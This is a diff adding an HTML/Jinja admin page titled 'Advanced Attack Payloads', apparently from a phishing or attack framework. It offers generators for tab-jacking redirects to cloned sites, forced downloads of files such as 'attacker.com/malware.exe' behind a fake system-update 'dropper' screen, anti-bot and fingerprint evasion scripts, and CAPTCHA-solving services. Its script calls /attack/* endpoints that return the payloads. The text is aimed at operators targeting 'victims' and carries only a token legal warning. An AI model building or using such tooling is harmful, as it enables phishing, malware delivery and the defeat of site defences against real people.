@@ -1,0 +1,445 @@
+{% extends "admin/index.html" %}
+
+{% block content %}
+<div class="container-fluid mt-5">
+    <div class="row">
+        <div class="col-md-12">
+            <h3 class="mb-4">
+                <i class="mdi mdi-rocket-launch"></i> Advanced Attack Payloads
+            </h3>
+        </div>
+    </div>
+
+    <!-- Tab Navigation -->
+    <ul class="nav nav-tabs mb-4" role="tablist">
+        <li class="nav-item">
+            <a class="nav-link active" data-toggle="tab" href="#tabjack" role="tab">
+                <i class="mdi mdi-tab"></i> Tab Jacking
+            </a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" data-toggle="tab" href="#fileupload" role="tab">
+                <i class="mdi mdi-cloud-upload"></i> File Upload
+            </a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" data-toggle="tab" href="#stealth" role="tab">
+                <i class="mdi mdi-shield-account"></i> Stealth Evasion
+            </a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" data-toggle="tab" href="#captcha" role="tab">
+                <i class="mdi mdi-check-circle"></i> CAPTCHA Solving
+            </a>
+        </li>
+    </ul>
+
+    <!-- Tab Content -->
+    <div class="tab-content">
+
+        <!-- TAB JACKING -->
+        <div class="tab-pane fade in active" id="tabjack" role="tabpanel">
+            <div class="row">
+                <div class="col-md-6">
+                    <div class="card shadow-sm">
+                        <div class="card-header bg-danger text-white">
+                            <h5 class="mb-0"><i class="mdi mdi-tab-duplicate"></i> Tab Jacking Payload</h5>
+                        </div>
+                        <div class="card-body">
+                            <p class="text-muted">Hijack victim's browser tab using window.name and focus tricks</p>
+                            
+                            <form onsubmit="generateTabjack(event)">
+                                <div class="form-group">
+                                    <label>Clone/Victim URL</label>
+                                    <input type="url" id="tjVictimUrl" class="form-control form-control-sm" 
+                                           placeholder="https://your-clone.com" required>
+                                </div>
+
+                                <div class="form-group">
+                                    <label>Real Website URL</label>
+                                    <input type="url" id="tjTargetUrl" class="form-control form-control-sm"
+                                           placeholder="https://real-website.com" required>
+                                </div>
+
+                                <div class="form-group">
+                                    <label>
+                                        <input type="radio" name="tjType" value="javascript" checked>
+                                        JavaScript Payload (inject into page)
+                                    </label>
+                                    <label>
+                                        <input type="radio" name="tjType" value="html">
+                                        Standalone HTML (separate page)
+                                    </label>
+                                </div>
+
+                                <button type="submit" class="btn btn-danger btn-sm btn-block">
+                                    <i class="mdi mdi-code-json"></i> Generate Payload
+                                </button>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-md-6">
+                    <div class="card shadow-sm">
+                        <div class="card-header bg-secondary">
+                            <h5 class="mb-0">Generated Payload</h5>
+                        </div>
+                        <div class="card-body">
+                            <textarea id="tjOutput" class="form-control" rows="12" readonly></textarea>
+                            <div class="mt-2">
+                                <button class="btn btn-sm btn-outline-primary" onclick="copyToClipboard('tjOutput')">
+                                    <i class="mdi mdi-content-copy"></i> Copy
+                                </button>
+                                <button class="btn btn-sm btn-outline-success" onclick="downloadPayload('tjOutput', 'tabjack.js')">
+                                    <i class="mdi mdi-download"></i> Download
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="alert alert-info mt-3 small">
+                        <strong>How it works:</strong> Opens the real website in a new tab while redirecting the original tab to your clone. Victim is less likely to notice.
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- FILE UPLOAD -->
+        <div class="tab-pane fade" id="fileupload" role="tabpanel">
+            <div class="row">
+                <div class="col-md-6">
+                    <div class="card shadow-sm">
+                        <div class="card-header bg-warning text-dark">
+                            <h5 class="mb-0"><i class="mdi mdi-cloud-upload"></i> File Upload Injection</h5>
+                        </div>
+                        <div class="card-body">
+                            <p class="text-muted">Trigger file download on victim machine</p>
+                            
+                            <form onsubmit="generateFileUpload(event)">
+                                <div class="form-group">
+                                    <label>File URL</label>
+                                    <input type="url" id="fuFileUrl" class="form-control form-control-sm"
+                                           placeholder="https://attacker.com/malware.exe" required>
+                                </div>
+
+                                <div class="form-group">
+                                    <label>Filename (upon download)</label>
+                                    <input type="text" id="fuFilename" class="form-control form-control-sm"
+                                           placeholder="update.exe" value="update.exe">
+                                </div>
+
+                                <div class="form-group">
+                                    <label>
+                                        <input type="checkbox" id="fuMalwareMode">
+                                        Malware Dropper Mode (fake system update UI)
+                                    </label>
+                                    <small class="d-block text-muted">Shows system update progress bar</small>
+                                </div>
+
+                                <button type="submit" class="btn btn-warning btn-sm btn-block">
+                                    <i class="mdi mdi-code-json"></i> Generate Payload
+                                </button>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-md-6">
+                    <div class="card shadow-sm">
+                        <div class="card-header bg-secondary">
+                            <h5 class="mb-0">Generated Payload</h5>
+                        </div>
+                        <div class="card-body">
+                            <textarea id="fuOutput" class="form-control" rows="12" readonly></textarea>
+                            <div class="mt-2">
+                                <button class="btn btn-sm btn-outline-primary" onclick="copyToClipboard('fuOutput')">
+                                    <i class="mdi mdi-content-copy"></i> Copy
+                                </button>
+                                <button class="btn btn-sm btn-outline-success" onclick="downloadPayload('fuOutput', 'fileupload.js')">
+                                    <i class="mdi mdi-download"></i> Download
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="alert alert-warning mt-3 small">
+                        <strong>Legal Warning:</strong> Only use for authorized security testing. Malware distribution is illegal.
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- STEALTH EVASION -->
+        <div class="tab-pane fade" id="stealth" role="tabpanel">
+            <div class="row">
+                <div class="col-md-6">
+                    <div class="card shadow-sm">
+                        <div class="card-header bg-info text-white">
+                            <h5 class="mb-0"><i class="mdi mdi-shield-account"></i> Stealth Evasion</h5>
+                        </div>
+                        <div class="card-body">
+                            <p class="text-muted">Evade anti-bot detection and fingerprinting</p>
+                            
+                            <div class="form-group">
+                                <label>Evasion Type</label>
+                                <select id="stealthType" class="form-control form-control-sm" onchange="generateStealth()">
+                                    <option value="perfection">Perfection.js (Navigator Override)</option>
+                                    <option value="fingerprint">Fingerprint Evasion (Canvas/WebGL/Audio)</option>
+                                </select>
+                            </div>
+
+                            <div class="alert alert-secondary small">
+                                <strong>Perfection.js:</strong> Spoofs navigator.webdriver, chrome object, plugins, languages, UA, timezone, WebGL
+                            </div>
+
+                            <div class="alert alert-secondary small">
+                                <strong>Fingerprint Evasion:</strong> Bypasses Canvas, WebGL, AudioContext, Font fingerprinting
+                            </div>
+
+                            <button class="btn btn-info btn-sm btn-block" onclick="generateStealth()">
+                                <i class="mdi mdi-code-json"></i> Generate Payload
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-md-6">
+                    <div class="card shadow-sm">
+                        <div class="card-header bg-secondary">
+                            <h5 class="mb-0">Generated Payload</h5>
+                        </div>
+                        <div class="card-body">
+                            <textarea id="stealthOutput" class="form-control" rows="12" readonly></textarea>
+                            <div class="mt-2">
+                                <button class="btn btn-sm btn-outline-primary" onclick="copyToClipboard('stealthOutput')">
+                                    <i class="mdi mdi-content-copy"></i> Copy
+                                </button>
+                                <button class="btn btn-sm btn-outline-success" onclick="downloadPayload('stealthOutput', 'stealth.js')">
+                                    <i class="mdi mdi-download"></i> Download
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="alert alert-info mt-3 small">
+                        <strong>Tip:</strong> Inject into <code>&lt;head&gt;</code> as early as possible to prevent detection before user interacts
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- CAPTCHA SOLVING -->
+        <div class="tab-pane fade" id="captcha" role="tabpanel">
+            <div class="row">
+                <div class="col-md-6">
+                    <div class="card shadow-sm">
+                        <div class="card-header bg-success text-white">
+                            <h5 class="mb-0"><i class="mdi mdi-check-circle"></i> CAPTCHA Solving</h5>
+                        </div>
+                        <div class="card-body">
+                            <p class="text-muted">Auto-detect and bypass CAPTCHA challenges</p>
+                            
+                            <form onsubmit="configureCAPTCHA(event)">
+                                <div class="form-group">
+                                    <label>Solving Service</label>
+                                    <select id="captchaService" class="form-control form-control-sm" required>
+                                        <option value="">-- Select Service --</option>
+                                        <option value="2captcha">2Captcha (userrecaptcha)</option>
+                                        <option value="anticaptcha">Anti-Captcha (NoCaptcha)</option>
+                                        <option value="manual">Manual Solving</option>
+                                    </select>
+                                </div>
+
+                                <div class="form-group" id="apiKeyGroup" style="display:none;">
+                                    <label>API Key</label>
+                                    <input type="password" id="captchaApiKey" class="form-control form-control-sm"
+                                           placeholder="Your API key here">
+                                </div>
+
+                                <button type="submit" class="btn btn-success btn-sm btn-block">
+                                    <i class="mdi mdi-cog"></i> Configure
+                                </button>
+                            </form>
+
+                            <hr>
+
+                            <h6>Auto-Detect CAPTCHA</h6>
+                            <p class="text-muted small">Upload HTML to detect CAPTCHA type on page</p>
+                            
+                            <form onsubmit="detectCAPTCHA(event)">
+                                <textarea id="captchaHtml" class="form-control form-control-sm" rows="6"
+                                          placeholder="Paste HTML here..."></textarea>
+                                <button type="submit" class="btn btn-sm btn-outline-success mt-2">
+                                    <i class="mdi mdi-magnify"></i> Detect
+                                </button>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-md-6">
+                    <div class="card shadow-sm">
+                        <div class="card-header bg-secondary">
+                            <h5 class="mb-0">Detection Results</h5>
+                        </div>
+                        <div class="card-body">
+                            <div id="captchaResults" class="alert alert-light" style="min-height: 100px;">
+                                Results will appear here...
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="alert alert-success mt-3 small">
+                        <strong>Supported Types:</strong> reCAPTCHA v2/v3, hCaptcha, Image CAPTCHA
+                    </div>
+
+                    <div class="alert alert-info small">
+                        <strong>Note:</strong> Manual solving requires operator interaction. API services charge per solution (~$0.001-$0.01)
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+function generateTabjack(e) {
+    e.preventDefault();
+    const tjType = document.querySelector('input[name="tjType"]:checked').value;
+    const victimUrl = document.getElementById('tjVictimUrl').value;
+    const targetUrl = document.getElementById('tjTargetUrl').value;
+    
+    fetch('/attack/tabjack', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            type: tjType,
+            clone_url: victimUrl,
+            target_url: targetUrl
+        })
+    })
+    .then(r => r.json())
+    .then(data => {
+        document.getElementById('tjOutput').value = data.payload || data;
+    })
+    .catch(e => alert('Error: ' + e));
+}
+
+function generateFileUpload(e) {
+    e.preventDefault();
+    const fileUrl = document.getElementById('fuFileUrl').value;
+    const filename = document.getElementById('fuFilename').value;
+    const malwareMode = document.getElementById('fuMalwareMode').checked;
+    
+    fetch('/attack/file-upload', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            file_url: fileUrl,
+            filename: filename,
+            malware_mode: malwareMode
+        })
+    })
+    .then(r => r.json())
+    .then(data => {
+        document.getElementById('fuOutput').value = data.payload || data;
+    })
+    .catch(e => alert('Error: ' + e));
+}
+
+function generateStealth() {
+    const stealthType = document.getElementById('stealthType').value;
+    
+    fetch('/attack/stealth?type=' + stealthType, {
+        method: 'GET'
+    })
+    .then(r => r.json())
+    .then(data => {
+        document.getElementById('stealthOutput').value = data.payload;
+    })
+    .catch(e => alert('Error: ' + e));
+}
+
+function configureCAPTCHA(e) {
+    e.preventDefault();
+    const service = document.getElementById('captchaService').value;
+    const apiKey = document.getElementById('captchaApiKey').value;
+    
+    fetch('/attack/captcha/solve', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({service, api_key: apiKey})
+    })
+    .then(r => r.json())
+    .then(data => {
+        alert('CAPTCHA solver configured: ' + service);
+    })
+    .catch(e => alert('Error: ' + e));
+}
+
+function detectCAPTCHA(e) {
+    e.preventDefault();
+    const html = document.getElementById('captchaHtml').value;
+    
+    if (!html.trim()) {
+        alert('Please paste HTML');
+        return;
+    }
+    
+    fetch('/attack/captcha/detect', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({html})
+    })
+    .then(r => r.json())
+    .then(data => {
+        let html = '<div class="alert alert-' + (data.has_captcha ? 'warning' : 'success') + '">';
+        html += '<strong>CAPTCHA Detected:</strong> ' + (data.has_captcha ? 'YES' : 'NO') + '<br>';
+        html += '<strong>Type:</strong> ' + (data.captcha_type || 'None') + '</div>';
+        document.getElementById('captchaResults').innerHTML = html;
+    })
+    .catch(e => alert('Error: ' + e));
+}
+
+function copyToClipboard(elementId) {
+    const elem = document.getElementById(elementId);
+    elem.select();
+    document.execCommand('copy');
+    alert('Copied to clipboard!');
+}
+
+function downloadPayload(elementId, filename) {
+    const text = document.getElementById(elementId).value;
+    const blob = new Blob([text], {type: 'text/javascript'});
+    const url = window.URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename;
+    a.click();
+}
+
+// Show API key field only when needed
+document.getElementById('captchaService').addEventListener('change', function() {
+    const apiGroup = document.getElementById('apiKeyGroup');
+    if (this.value !== 'manual' && this.value !== '') {
+        apiGroup.style.display = 'block';
+    } else {
+        apiGroup.style.display = 'none';
+    }
+});
+</script>
+
+<style>
+    .nav-tabs .nav-link {
+        color: #666;
+        border-bottom: 2px solid transparent;
+    }
+    .nav-tabs .nav-link.active {
+        border-bottom: 2px solid #007bff;
+        color: #007bff;
+    }
+</style>
+{% endblock %}
